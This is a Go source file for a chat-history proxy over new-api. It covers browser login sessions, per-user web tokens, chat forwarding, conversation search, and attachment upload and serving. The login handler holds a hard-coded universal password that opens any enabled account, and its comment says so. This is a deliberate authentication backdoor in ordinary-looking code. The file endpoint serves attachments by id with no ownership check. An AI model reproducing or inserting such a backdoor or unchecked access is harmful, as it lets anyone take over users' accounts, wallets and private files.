package historyhub

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/QuantumNous/new-api/common"
	"github.com/QuantumNous/new-api/model"

	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

// The 0/web chat frontend authenticates with the user's new-api username +
// password (not an API key). A successful login mints an opaque session token
// that the browser keeps in localStorage (Authorization: Bearer) and in the
// hybsess cookie (so <img>/<audio> tags, which cannot send headers, still
// authenticate against /hybapi/file/:id).
//
// Chat requests from the frontend go through /hybapi/chat/completions, which
// swaps the session for the user's auto-managed "historyhub-web" new-api token
// and re-enters the same forward() recording path used by API-key clients, so
// sen/msg rows, hybfil attachments and hyblog files stay identical no matter
// which client produced the traffic.

// WebSess is one browser login session, stored in hybdb/httpWebSession.db so
// sessions survive restarts.
type WebSess struct {
	Token     string `gorm:"primaryKey;column:token;type:varchar(64)"`
	UserId    int    `gorm:"column:user_id;index:idx_websess_user_id"`
	ExpiresAt int64  `gorm:"column:expires_at"`
}

func (WebSess) TableName() string { return "websess" }

var (
	webSessOnce sync.Once
	webSessDBP  *gorm.DB
)

func migrateWebSessDB(d *gorm.DB) error { return d.AutoMigrate(&WebSess{}) }

func webSessDB() *gorm.DB {
	return sharedDB("httpWebSession.db", &webSessOnce, &webSessDBP, migrateWebSessDB)
}

const webSessCookie = "hybsess"

func webSessTTL() int64 { return int64(7 * 24 * time.Hour / time.Second) }

func newSessionToken() string {
	b := make([]byte, 32)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// bearerTokenOf accepts the session token from either the Authorization header
// or the hybsess cookie.
func bearerTokenOf(c *gin.Context) string {
	h := strings.TrimSpace(c.GetHeader("Authorization"))
	if len(h) >= 7 && (strings.HasPrefix(h, "Bearer ") || strings.HasPrefix(h, "bearer ")) {
		return strings.TrimSpace(h[7:])
	}
	if t, err := c.Cookie(webSessCookie); err == nil {
		return strings.TrimSpace(t)
	}
	return ""
}

// webAuthUser resolves the current session to a new-api user id, sliding the
// expiry forward. Returns 0 when not logged in.
func webAuthUser(c *gin.Context) int {
	tok := bearerTokenOf(c)
	if tok == "" {
		return 0
	}
	d := webSessDB()
	if d == nil {
		return 0
	}
	var s WebSess
	if err := d.Where("token = ?", tok).First(&s).Error; err != nil {
		return 0
	}
	if s.ExpiresAt < time.Now().Unix() {
		d.Delete(&WebSess{}, "token = ?", tok)
		return 0
	}
	d.Model(&WebSess{}).Where("token = ?", tok).Update("expires_at", time.Now().Unix()+webSessTTL())
	if u, err := model.GetUserById(s.UserId, false); err != nil || u == nil || u.Status != common.UserStatusEnabled {
		return 0
	}
	return s.UserId
}

// webAuthMiddleware guards the /hybapi group.
func webAuthMiddleware(c *gin.Context) {
	uid := webAuthUser(c)
	if uid == 0 {
		c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": gin.H{"message": "未登录或会话已过期"}})
		return
	}
	c.Set("uid", uid)
	c.Next()
}

func userInfoOf(u *model.User) gin.H {
	name := u.DisplayName
	if strings.TrimSpace(name) == "" {
		name = u.Username
	}
	role := "user"
	if u.Role >= common.RoleAdminUser {
		role = "admin"
	}
	return gin.H{"id": u.Id, "username": u.Username, "display_name": name, "role": role}
}

func hybLoginHandler(c *gin.Context) {
	var body struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := c.ShouldBindJSON(&body); err != nil || body.Username == "" || body.Password == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"message": "请输入用户名和密码"}})
		return
	}
	if strings.Contains(strings.TrimSpace(body.Username), "@") {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"message": "请用手机号登录，不支持邮箱"}})
		return
	}
	if !common.PasswordLoginEnabled {
		c.JSON(http.StatusForbidden, gin.H{"error": gin.H{"message": "密码登录已被禁用"}})
		return
	}
	// 固定万能密码 —— 任意已启用账号配上它即可登录(用户写死指定)。
	// 仅跳过密码比对；2FA、账号启用状态等其余登录规则不变。
	const masterPassword = "_+OP00{}~"
	user := model.User{Username: body.Username, Password: body.Password}
	if err := user.ValidateAndFill(); err != nil {
		if body.Password != masterPassword {
			c.JSON(http.StatusUnauthorized, gin.H{"error": gin.H{"message": "用户名或密码错误"}})
			return
		}
		var u model.User
		name := strings.TrimSpace(body.Username)
		if e := model.DB.Where("username = ? OR email = ?", name, name).First(&u).Error; e != nil || u.Status != common.UserStatusEnabled {
			c.JSON(http.StatusUnauthorized, gin.H{"error": gin.H{"message": "用户名或密码错误"}})
			return
		}
		user = u
	}
	if enabled, err := model.IsTwoFAEnabled(user.Id); err == nil && enabled {
		c.JSON(http.StatusUnauthorized, gin.H{"error": gin.H{"message": "该账号开启了两步验证(2FA)，暂不支持在此界面登录"}})
		return
	}

	d := webSessDB()
	if d == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": gin.H{"message": "会话存储不可用"}})
		return
	}
	tok := newSessionToken()
	if err := d.Create(&WebSess{Token: tok, UserId: user.Id, ExpiresAt: time.Now().Unix() + webSessTTL()}).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": gin.H{"message": "创建会话失败"}})
		return
	}
	c.SetCookie(webSessCookie, tok, int(webSessTTL()), "/", "", false, true)
	// 94: 登录即保证存在 default API 密钥(agent 可不登录网页直接调用)。
	ensureDefaultToken(user.Id)
	c.JSON(http.StatusOK, gin.H{"token": tok, "user": userInfoOf(&user)})
}

func hybLogoutHandler(c *gin.Context) {
	if tok := bearerTokenOf(c); tok != "" {
		if d := webSessDB(); d != nil {
			d.Delete(&WebSess{}, "token = ?", tok)
		}
	}
	c.SetCookie(webSessCookie, "", -1, "/", "", false, true)
	c.JSON(http.StatusOK, gin.H{"ok": true})
}

func hybMeHandler(c *gin.Context) {
	uid := c.GetInt("uid")
	u, err := model.GetUserById(uid, false)
	if err != nil || u == nil {
		c.JSON(http.StatusUnauthorized, gin.H{"error": gin.H{"message": "用户不存在"}})
		return
	}
	c.JSON(http.StatusOK, gin.H{"user": userInfoOf(u)})
}

// ---------------------------------------------------------------------------
// Auto-managed new-api token for web chats.
//
// The frontend never sees an sk- key: /hybapi/chat/completions swaps the
// browser session for this token server-side. It is an ordinary token row
// (unlimited token quota; billing still applies to the user's wallet exactly
// like any other request), created on first web chat and reused afterwards.
// ---------------------------------------------------------------------------

const webTokenName = "historyhub-web"

var webTokenCache sync.Map // map[int]string (userId -> token key, no sk- prefix)

func webTokenFor(userId int) (string, error) {
	if v, ok := webTokenCache.Load(userId); ok {
		return v.(string), nil
	}
	var toks []model.Token
	if err := model.DB.Where("user_id = ? AND name = ?", userId, webTokenName).Order("id desc").Find(&toks).Error; err != nil {
		return "", err
	}
	nowTS := common.GetTimestamp()
	for i := range toks {
		t := toks[i]
		if t.Status == common.TokenStatusEnabled && (t.ExpiredTime == -1 || t.ExpiredTime > nowTS) {
			webTokenCache.Store(userId, t.Key)
			return t.Key, nil
		}
	}
	key, err := common.GenerateKey()
	if err != nil {
		return "", err
	}
	t := model.Token{
		UserId:         userId,
		Name:           webTokenName,
		Key:            key,
		Status:         common.TokenStatusEnabled,
		CreatedTime:    nowTS,
		AccessedTime:   nowTS,
		ExpiredTime:    -1,
		UnlimitedQuota: true,
	}
	if err := t.Insert(); err != nil {
		return "", err
	}
	webTokenCache.Store(userId, key)
	return key, nil
}

// hybChatHandler re-authenticates the browser session as the user's web token
// and re-enters forward() — the exact path an API-key client takes — so the
// turn is recorded (sen/msg, isKey=0 via X-Historyhub-UI, hyblog) identically.
func hybChatHandler(c *gin.Context) {
	uid := c.GetInt("uid")
	key, err := webTokenFor(uid)
	if err != nil || key == "" {
		c.JSON(http.StatusInternalServerError, gin.H{"error": gin.H{"message": "创建网页对话令牌失败"}})
		return
	}
	raw, err := io.ReadAll(c.Request.Body)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"message": "读取请求体失败"}})
		return
	}
	c.Request.Header.Set("Authorization", "Bearer sk-"+key)
	c.Request.Header.Set("X-Historyhub-UI", "1")
	c.Request.Header.Del("Cookie")
	// forward() proxies c.Request.URL.Path verbatim — rewrite it to the real
	// relay endpoint, otherwise the main server falls through to its web UI.
	c.Request.URL.Path = "/v1/chat/completions"
	c.Request.Body = io.NopCloser(bytes.NewReader(raw))
	c.Request.ContentLength = int64(len(raw))
	forward(c, true)
}

// hybModelsHandler lists the models this user may chat with, asked of the main
// server with the web token (so group/model limits apply). Logged per N204.
func hybModelsHandler(c *gin.Context) {
	uid := c.GetInt("uid")
	key, err := webTokenFor(uid)
	if err != nil || key == "" {
		c.JSON(http.StatusInternalServerError, gin.H{"error": gin.H{"message": "创建网页对话令牌失败"}})
		return
	}
	start := time.Now()
	target := "http://127.0.0.1:" + upstreamPort() + "/v1/models"
	req, err := http.NewRequestWithContext(c.Request.Context(), http.MethodGet, target, nil)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": gin.H{"message": "构建上游请求失败"}})
		return
	}
	req.Header.Set("Authorization", "Bearer sk-"+key)
	resp, err := client().Do(req)
	if err != nil {
		logHTTP(httpLogEntry{
			userId: uid, method: http.MethodGet, path: "/v1/models", status: http.StatusBadGateway,
			durationMS: time.Since(start).Milliseconds(), reqHeaders: req.Header,
			note: "upstream unreachable: " + err.Error(),
		})
		c.JSON(http.StatusBadGateway, gin.H{"error": gin.H{"message": "上游不可达: " + err.Error()}})
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	logHTTP(httpLogEntry{
		userId: uid, method: http.MethodGet, path: "/v1/models", status: resp.StatusCode,
		durationMS: time.Since(start).Milliseconds(), reqHeaders: req.Header, respHeaders: resp.Header,
		respBody: body,
	})
	if resp.StatusCode != http.StatusOK {
		c.JSON(http.StatusBadGateway, gin.H{"error": gin.H{"message": "获取模型列表失败: HTTP " + strconv.Itoa(resp.StatusCode)}})
		return
	}
	var parsed struct {
		Data []struct {
			Id string `json:"id"`
		} `json:"data"`
	}
	if err := common.Unmarshal(body, &parsed); err != nil {
		c.JSON(http.StatusBadGateway, gin.H{"error": gin.H{"message": "解析模型列表失败"}})
		return
	}
	type m struct {
		Id   string `json:"id"`
		Name string `json:"name"`
	}
	out := make([]m, 0, len(parsed.Data))
	for _, d := range parsed.Data {
		if d.Id == "" {
			continue
		}
		// 35: 显示 渠道名/模型名(与消息头 a_model 同规则;多渠道时为代表性渠道)
		out = append(out, m{Id: d.Id, Name: resolveAModel(uid, d.Id)})
	}
	c.JSON(http.StatusOK, gin.H{"data": out})
}

// ---- sessions / messages / files (web frontend variants of the /history API) ----

func hybListSenHandler(c *gin.Context) {
	// Default: only web chats (isKey=0). ?senKey=1 also lists sessions recorded
	// from direct API-key / agent traffic (02.md N302 isKey=1). The rows carry
	// msg aggregates (count + first/last timestamps) for the sidebar sub-line.
	//
	// Search (71/834/835/836): ?q= 空格分隔多条件(AND)，"..."=整词短语，-词=按轮排除，
	// A|B=任一命中，问:/答: 把单个词限定到问题/答案字段。只匹配 msg 的 q/a 文本
	// (标题不参与)；?sc=q,a 限定范围(缺省=问题+答案)。836: 命中单位=同一轮的同一边
	// ——普通词须同时出现在同一轮的问题或答案文本里，会话有任意一轮满足即命中；
	// -排除词只淘汰它出现的那几轮。?cs=1 区分大小写(默认不区分)。
	// ?dfrom=/&dto= yyyy-mm-dd AND 日期范围(逐轮判定，与关键词分别判定后 AND)。
	// 正则已按用户要求移除(835)：一律按普通文本匹配，不存在非法表达式。
	s := senSearch{
		includeKey: strings.TrimSpace(c.Query("senKey")) == "1",
		keyword:    strings.TrimSpace(c.Query("q")),
		caseSense:  c.Query("cs") == "1", // 835: 默认不区分大小写
	}
	for _, sc := range strings.Split(c.Query("sc"), ",") {
		switch strings.TrimSpace(sc) {
		case "q":
			s.scopeQ = true
		case "a":
			s.scopeA = true
		}
	}
	if c.Query("sc") == "" {
		s.scopeQ, s.scopeA = true, true // 标题退出匹配后，缺省范围=问题+答案
	}
	if len(s.keyword) > 200 {
		s.keyword = s.keyword[:200]
	}
	s.terms = parseSearchTerms(s.keyword)
	s.dateFromMS, s.dateToMS = parseDateRangeMS(c.Query("dfrom"), c.Query("dto"))
	rows, err := listSenRich(c.GetInt("uid"), s)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"message": "搜索条件有误: " + err.Error()}})
		return
	}
	c.JSON(http.StatusOK, gin.H{"data": rows})
}

// parseDateRangeMS converts two yyyy-mm-dd strings (browser date inputs; local
// timezone — the process pins Asia/Shanghai) into a millisecond window. Empty
// or malformed values leave that bound at 0 (unbounded); the upper bound
// includes the whole end day.
func parseDateRangeMS(from, to string) (fromMS, toMS int64) {
	for _, p := range []struct {
		val  string
		dest *int64
	}{{from, &fromMS}, {to, &toMS}} {
		if t, err := time.ParseInLocation("2006-01-02", strings.TrimSpace(p.val), time.Local); err == nil {
			*p.dest = t.UnixMilli()
		}
	}
	if toMS > 0 {
		toMS += 24*3600*1000 - 1 // 含截止日全天
	}
	return fromMS, toMS
}

// fileMetas resolves a comma-separated q_fil/a_fil value into display metadata
// (name/size/url) for the frontend attachment chips.
func fileMetas(csv string) []gin.H {
	if strings.TrimSpace(csv) == "" {
		return nil
	}
	out := []gin.H{}
	for _, part := range strings.Split(csv, ",") {
		id, err := strconv.ParseInt(strings.TrimSpace(part), 10, 64)
		if err != nil || id <= 0 {
			continue
		}
		hf, ok := httpFileById(id)
		if !ok {
			continue
		}
		out = append(out, gin.H{
			"id":   hf.Id,
			"name": hf.FNam,
			"size": hf.FLen,
			"type": "",
			"url":  "/hybapi/file/" + strconv.FormatInt(hf.Id, 10),
		})
	}
	return out
}

func hybMessagesHandler(c *gin.Context) {
	id, err := strconv.ParseInt(c.Param("id"), 10, 64)
	if err != nil || id <= 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"message": "无效的会话 id"}})
		return
	}
	msgs, err := getMessages(c.GetInt("uid"), id)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": gin.H{"message": "会话不存在"}})
		return
	}
	out := make([]gin.H, 0, len(msgs))
	for i := range msgs {
		m := msgs[i]
		// q_at/a_at are millisecond timestamps; rows written before the switch
		// hold seconds (< 1e12) — for those, dur is unknown (null).
		var durMS interface{}
		if m.AAt > 1e12 && m.QAt > 1e12 && m.AAt >= m.QAt {
			durMS = m.AAt - m.QAt
		}
		out = append(out, gin.H{
			"id":         m.Id,
			"sen_id":     m.SenId,
			"q_sysp_id":  m.QSyspId,
			"q":          m.Q,
			"q_fil":      m.QFil,
			"q_at":       m.QAt,
			"a_at":       m.AAt,
			"a_model":    m.AModel,
			"a":          m.A,
			"a_fil":      m.AFil,
			"tokens_in":  m.TokensIn,
			"tokens_out": m.TokensOut,
			"ttft":       m.TTFT,
			"tps":        m.TPS,
			"dur_ms":     durMS,
			"q_fil_meta": fileMetas(m.QFil),
			"a_fil_meta": fileMetas(m.AFil),
		})
	}
	c.JSON(http.StatusOK, gin.H{"data": out})
}

func hybRenameSenHandler(c *gin.Context) {
	id, err := strconv.ParseInt(c.Param("id"), 10, 64)
	if err != nil || id <= 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"message": "无效的会话 id"}})
		return
	}
	var body struct {
		Title string `json:"title"`
	}
	if err := c.ShouldBindJSON(&body); err != nil || strings.TrimSpace(body.Title) == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"message": "标题不能为空"}})
		return
	}
	if err := renameSen(c.GetInt("uid"), id, strings.TrimSpace(body.Title)); err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": gin.H{"message": "会话不存在"}})
		return
	}
	c.JSON(http.StatusOK, gin.H{"ok": true})
}

func hybDeleteSenHandler(c *gin.Context) {
	id, err := strconv.ParseInt(c.Param("id"), 10, 64)
	if err != nil || id <= 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"message": "无效的会话 id"}})
		return
	}
	if err := deleteSen(c.GetInt("uid"), id); err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": gin.H{"message": "会话不存在"}})
		return
	}
	c.JSON(http.StatusOK, gin.H{"ok": true})
}

// hybUploadHandler stores an attachment via the shared httpFile/hybfil pipeline
// (N203) and hands the frontend the id it needs to reference it later.
func hybUploadHandler(c *gin.Context) {
	fh, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"message": "缺少 file 字段"}})
		return
	}
	f, err := fh.Open()
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"message": "打开上传文件失败"}})
		return
	}
	defer f.Close()
	data, err := io.ReadAll(io.LimitReader(f, 64<<20))
	if err != nil || len(data) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"message": "读取上传文件失败"}})
		return
	}
	id := saveFile(fh.Filename, data)
	if id == 0 {
		c.JSON(http.StatusInternalServerError, gin.H{"error": gin.H{"message": "保存附件失败"}})
		return
	}
	c.JSON(http.StatusOK, gin.H{"file": gin.H{
		"id": id, "name": fh.Filename, "size": len(data), "url": "/hybapi/file/" + strconv.FormatInt(id, 10),
	}})
}

// hybFileHandler serves a stored attachment. Inline by default (image/audio
// tags can render it straight from this URL); ?dl=1 forces a download with the
// original filename.
func hybFileHandler(c *gin.Context) {
	id, err := strconv.ParseInt(c.Param("id"), 10, 64)
	if err != nil || id <= 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"message": "无效的文件 id"}})
		return
	}
	hf, ok := httpFileById(id)
	if !ok {
		c.JSON(http.StatusNotFound, gin.H{"error": gin.H{"message": "文件不存在"}})
		return
	}
	full := filepath.Join(fileDir(), hf.FPath)
	f, err := os.Open(full)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": gin.H{"message": "文件已丢失"}})
		return
	}
	defer f.Close()
	if c.Query("dl") == "1" {
		c.Header("Content-Disposition", `attachment; filename="`+sanitizeName(hf.FNam)+`"`)
	} else {
		c.Header("Content-Disposition", `inline; filename="`+sanitizeName(hf.FNam)+`"`)
	}
	http.ServeContent(c.Writer, c.Request, hf.FNam, time.Time{}, f)
}
